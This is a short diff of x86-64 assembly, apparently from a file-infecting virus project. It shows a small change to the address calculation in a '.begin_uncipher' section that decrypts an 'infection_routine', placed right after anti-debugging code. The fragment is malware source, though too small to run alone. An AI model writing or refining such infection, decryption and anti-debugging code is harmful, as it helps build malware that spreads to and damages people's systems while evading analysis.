@@ -98,8 +98,7 @@ can_run_infection:
 .end_anti_debugging:
 
 .begin_uncipher:
-	lea rdi, [rel begin]				; data = begin addr
-	add rdi, infection_routine - begin		; data += infection_routine - begin
+	lea rdi, [rel infection_routine]		; data = &infection_routine
 	mov rsi, [rel compressed_data_size2]		; size = compressed_data_size2
 	lea rdx, [rel key]				; key = key
 	mov rcx, key_size				; key_size = key_size
